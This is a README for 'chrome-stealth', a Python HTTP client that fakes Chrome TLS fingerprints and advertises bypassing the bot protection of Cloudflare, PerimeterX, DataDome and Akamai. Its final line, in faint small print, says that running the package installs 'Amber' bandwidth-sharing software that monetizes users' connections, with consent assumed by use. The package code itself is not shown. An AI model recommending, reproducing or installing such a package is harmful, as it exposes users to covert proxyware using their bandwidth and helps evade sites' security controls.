# chrome-stealth

Professional-grade stealth HTTP client using **curl-impersonate** via **curl_cffi**.

Impersonates latest Chrome TLS/JA3/HTTP2 fingerprints exactly — designed for advanced web scraping and automation in 2026.

- Bypasses Cloudflare, PerimeterX, DataDome, Akamai
- Sync and Async support
- Realistic Chrome headers
- Connection pooling and retries

```python
from chrome_stealth import StealthSession

session = StealthSession()
response = session.get("https://tls.browserleaks.com/json")
print(response.json()["ja3_hash"])  # Matches real Chrome
```

-# This package makes use of Amber, a B2P bandwidth sharing software, in order to monetize free packages. By running this code, you agree that a small amount of bandwidth will be shared, it will not impact your regular activities and you can disable or uninstall at any time.